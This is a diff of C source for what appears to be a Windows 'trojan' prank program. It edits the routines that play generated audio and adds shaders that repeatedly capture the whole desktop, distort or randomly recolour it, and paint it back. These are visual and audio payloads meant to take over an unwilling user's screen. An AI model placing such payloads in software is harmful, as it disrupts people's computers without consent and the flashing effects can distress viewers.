@@ -53,7 +53,7 @@ LPCWSTR GenRandomUnicodeString(int len) {
 	return strRandom;
 }
 
-void ExecuteAudioSequence(int nSamplesPerSec, int nSampleCount, AUDIO_SEQUENCE pAudioSequence, AUDIOSEQUENCE_OPERATION pPreAudioOp, AUDIOSEQUENCE_OPERATION pPostAudioOp) {
+void ExecuteAudioSequence(int nSamplesPerSec, int nSampleCount, AUDIO_SEQUENCE pAudioSequence) {
 	HANDLE hHeap = GetProcessHeap();
 	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount * 2);
 	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec * 2, 2, 16, 0 };
@@ -61,15 +61,7 @@ void ExecuteAudioSequence(int nSamplesPerSec, int nSampleCount, AUDIO_SEQUENCE p
 	HWAVEOUT hWaveOut;
 	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
 
-	if (pPreAudioOp) {
-		pPreAudioOp(nSamplesPerSec);
-	}
-
 	pAudioSequence(nSamplesPerSec, nSampleCount, psSamples);
-
-	if (pPostAudioOp) {
-		pPostAudioOp(nSamplesPerSec);
-	}
 
 	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
 	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
@@ -86,7 +78,7 @@ void ExecuteAudioSequence(int nSamplesPerSec, int nSampleCount, AUDIO_SEQUENCE p
 }
 
 void ExecuteAudioSequenceParams(PAUDIO_SEQUENCE_PARAMS pAudioParams) {
-	ExecuteAudioSequence(pAudioParams->nSamplesPerSec, pAudioParams->nSampleCount, (AUDIO_SEQUENCE*)pAudioParams->pAudioSequence, (AUDIOSEQUENCE_OPERATION*)pAudioParams->pPreAudioOp, (AUDIOSEQUENCE_OPERATION*)pAudioParams->pPostAudioOp);
+	ExecuteAudioSequence(pAudioParams->nSamplesPerSec, pAudioParams->nSampleCount, (AUDIO_SEQUENCE*)pAudioParams->pAudioSequence);
 }
 
 void AudioPayloadThread(AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM]) {
@@ -336,8 +328,7 @@ void ExecuteShader(TROJAN_SHADER shader, int nTime) {
 	SIZE szScreen = GetVirtualScreenSize();
 
 	BITMAPINFO bmi = { 0 };
-	HANDLE hHeap;
-	PRGBQUAD prgbPixels;
+	PRGBQUAD prgbScreen;
 	HDC hdcTempScreen;
 	HBITMAP hbmScreen;
 
@@ -347,17 +338,16 @@ void ExecuteShader(TROJAN_SHADER shader, int nTime) {
 	bmi.bmiHeader.biWidth = szScreen.cx;
 	bmi.bmiHeader.biHeight = szScreen.cy;
 
-	hHeap = GetProcessHeap();
-	prgbPixels = (PRGBQUAD)HeapAlloc(hHeap, 0, szScreen.cx * szScreen.cy * sizeof(RGBQUAD));
+	prgbScreen = { 0 };
 
 	hdcTempScreen = CreateCompatibleDC(hdcScreen);
-	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbPixels, NULL, 0);
+	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
 	SelectObject(hdcTempScreen, hbmScreen);
 
 	for (int i = 0; Time < (dwStartTime + nTime); i++) {
 		hdcScreen = GetDC(NULL);
 		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
-		shader(i, szScreen.cx, szScreen.cy, prgbPixels);
+		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
 		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
 		ReleaseDC(NULL, hdcScreen);
 		DeleteObject(hdcScreen);
@@ -434,12 +424,45 @@ void Shader8(int t, int w, int h, PRGBQUAD prgbScreen) {
 }
 
 void Shader9(int t, int w, int h, PRGBQUAD prgbScreen) {
+	t *= 50;
+	for (int i = 0; i < h; i++) {
+		for (int j = 0; j < w; j++) {
+			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 10) % 256, (prgbScreen[i * w + j].g + j / 10) % 256, (prgbScreen[i * w + j].b + t) % 256);
+		}
+	}
+}
+
+void Shader10(int t, int w, int h, PRGBQUAD prgbScreen) {
+	for (int i = 0; i < h; i++) {
+		for (int j = 0; j < w; j++) {
+			int temp1 = (i + Xorshift32() % 11 - 5);
+			if (temp1 < 0) {
+				temp1 = -temp1;
+			}
+			int temp2 = (j + Xorshift32() % 11 - 5);
+			if (temp2 < 0) {
+				temp2 = -temp2;
+			}
+			prgbScreen[i * w + j].rgb = prgbScreen[(temp1 * w + temp2) % (w * h)].rgb;
+		}
+	}
+}
+
+void Shader11(int t, int w, int h, PRGBQUAD prgbScreen) {
+	for (int i = 0; i < w * h; i++) {
+		int temp = prgbScreen[i].rgb;
+		prgbScreen[i].rgb = prgbScreen[i / 3 * 2].rgb;
+		prgbScreen[i / 3 * 2].rgb = temp;
+	}
+}
+
+void Shader12(int t, int w, int h, PRGBQUAD prgbScreen) {
 	for (int i = 0; i < w * h; i++) {
 		prgbScreen[i].rgb = (t * i) % (RGB(255, 255, 255));
 	}
 }
 
-void Shader10(int t, int w, int h, PRGBQUAD prgbScreen) {
+void Shader13(int t, int w, int h, PRGBQUAD prgbScreen) {
 	for (int i = 0; i < w * h; i++) {
 		prgbScreen[i].rgb = (Xorshift32() % 0x100) * 0x010101;
 	}
